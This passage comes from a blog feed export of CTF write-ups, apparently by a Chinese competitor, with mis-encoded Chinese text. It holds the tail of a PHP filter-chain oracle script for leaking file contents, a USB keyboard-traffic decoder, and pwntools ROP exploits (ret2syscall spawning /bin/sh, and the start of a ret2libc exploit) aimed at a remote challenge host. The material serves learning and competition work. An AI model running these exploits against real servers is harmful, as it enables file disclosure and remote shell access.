m</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;m&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># y</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;y&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># Y</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Y&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># l</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;l&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># L</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;L&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># h</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;h&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># H</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;H&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># u</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;u&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># U</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;U&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># g</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;g&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># G</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;G&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># t</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;t&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># T</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;T&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>&#x27;</span></span><br><span class="line">    letter = find_letter(prefix)</span><br><span class="line">    <span class="comment"># it&#x27;s a number! check base64</span></span><br><span class="line">    <span class="keyword">if</span> letter == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode&#x27;</span></span><br><span class="line">        s = find_letter(prefix)</span><br><span class="line">        <span class="keyword">if</span> s == <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">            <span class="comment"># 0 - 3</span></span><br><span class="line">            prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">            ss = find_letter(prefix)</span><br><span class="line">            <span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;ijklmn&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;yz*&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> s == <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">            <span class="comment"># 4 - 7</span></span><br><span class="line">            prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">            ss = find_letter(prefix)</span><br><span class="line">            <span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;ijklmn&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;6&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;yz*&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;7&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> s == <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">            <span class="comment"># 8 - 9</span></span><br><span class="line">            prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">            ss = find_letter(prefix)</span><br><span class="line">            <span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;wtf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(end=letter)</span><br><span class="line">    o += letter</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">We are done!! :)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">d = b64decode(o.encode() + <span class="string">b&#x27;=&#x27;</span> * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove KR padding</span></span><br><span class="line"></span><br><span class="line">d = d.replace(<span class="string">b&#x27;$)C&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b64decode(d))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ä¾§ä¿¡é“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç»“è¥èµ›Wp</title>
      <link href="/2023/09/01/%E7%BB%93%E8%90%A5%E8%B5%9Bwp/"/>
      <url>/2023/09/01/%E7%BB%93%E8%90%A5%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="ç»“è¥èµ›wp"><a href="#ç»“è¥èµ›wp" class="headerlink" title="ç»“è¥èµ›wp"></a>ç»“è¥èµ›wp</h1><p>æœ€ç»ˆæ’åç¬¬10ï¼Œè¿˜å¯ä»¥å§</p><p>##misc</p><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>hsnctf{welcome_to_hsnctf}</p><h3 id="easyusb"><a href="#easyusb" class="headerlink" title="easyusb"></a>easyusb</h3><p>æ‰“å¼€å‹ç¼©åŒ…å‘ç°ï¼Œä¸€ä¸ªæµé‡åŒ…å’Œä¸€ä¸ªflag.zipåŠ å¯†</p><p>åº”è¯¥æ˜¯é€šè¿‡æµé‡åŒ…å¾—åˆ°å¯†ç è§£å¾—flag</p><p>æµé‡åŒ…æ˜¯é”®ç›˜æµé‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â”€$ tshark -T json -r usb.pcapng &gt; test.json </span><br></pre></td></tr></table></figure><p><img src="/2023/09/01/%E7%BB%93%E8%90%A5%E8%B5%9Bwp/image/QQ%E5%9B%BE%E7%89%8720230818231436-1700989357412-27-1700994419702-2.png"></p><p>æ‰‹åŠ¨æå–é”®ç›˜æµé‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">16</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">06</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">1f</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">17</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>e:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">20</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">1</span>c:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br></pre></td></tr></table></figure><p>ä¹‹ååˆ©ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç ä¸ºSEC2ETK3Yï¼ˆå¤§å†™ï¼‰ï¼Œè§£å¼€å‹ç¼©åŒ…å¾—åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hsnctf&#123;y0u_can_g4t_easy_usb&#125;</span><br></pre></td></tr></table></figure><p>##pwn</p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"># from ctypes <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;58.240.236.231&#x27;</span>,<span class="number">49003</span>)</span><br><span class="line"></span><br><span class="line"># r = gdb.debug(<span class="string">&#x27;./bheap&#x27;</span>)</span><br><span class="line"># r = process(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"># libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"># libc = ELF(<span class="string">&#x27;/home/h711/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"># ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span></span><br><span class="line"># srand = libc.srand(libc.time(<span class="number">0</span>)) #è®¾ç½®ç§å­</span><br><span class="line"></span><br><span class="line">se      = lambda data               :r.send(data)</span><br><span class="line">sa      = lambda delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :r.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :r.sendlineafter(delim, data)</span><br><span class="line">sea     = lambda delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = lambda numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = lambda                    :r.recvline()</span><br><span class="line">ru      = lambda delims             :r.recvuntil(delims)</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(<span class="number">4</span>, b<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(<span class="number">8</span>, b<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">lic = lambda data               :uu64(ru(data)[-<span class="number">6</span>:])</span><br><span class="line">pack    = lambda str, addr          :p32(addr)</span><br><span class="line">padding = lambda lenth              :b<span class="string">&#x27;aaaaa&#x27;</span>*(lenth<span class="comment">//5)+b&#x27;F&#x27;*(lenth % 5)</span></span><br><span class="line">it      = lambda                    :r.interactive()</span><br><span class="line"></span><br><span class="line">rax = <span class="number">0x0000000000400721</span> #: pop rax ; <span class="type">ret</span></span><br><span class="line"><span class="variable">rdx</span> <span class="operator">=</span> <span class="number">0x0000000000400721</span> #: pop rdx ; <span class="type">ret</span></span><br><span class="line"><span class="variable">rsi</span> <span class="operator">=</span> <span class="number">0x000000000400735</span> #: pop rsi ; <span class="type">ret</span></span><br><span class="line"><span class="variable">rdx</span> <span class="operator">=</span> <span class="number">0x000000000400735</span>#:  pop rdx ; <span class="type">ret</span></span><br><span class="line"><span class="variable">ret</span> <span class="operator">=</span> <span class="number">0x0000000000400509</span> #: <span class="type">ret</span></span><br><span class="line"><span class="variable">binsh</span> <span class="operator">=</span> <span class="number">0x0000000000601048</span> #: /bin/<span class="type">sh</span></span><br><span class="line"><span class="variable">syscall</span> <span class="operator">=</span> <span class="number">0x000000000400741</span></span><br><span class="line">rdi = <span class="number">0x000000000040072b</span> #: pop rdi ; <span class="type">ret</span></span><br><span class="line"></span><br><span class="line"><span class="variable">pl</span> <span class="operator">=</span> b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(rax) + p64(<span class="number">0x3b</span>) + p64(rsi) + p64(<span class="number">0</span>) + p64(rdx) + p64(<span class="number">0</span>) + p64(rdi) + p64(binsh) + p64(syscall)</span><br><span class="line">sl(pl)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure><p>hsnctf{85ef9d72-c603-17df-59bc}</p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from ctypes import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;58.240.236.231&#x27;</span>,<span class="number">49002</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = gdb.debug(&#x27;./bheap&#x27;)</span></span><br><span class="line"><span class="comment"># r = 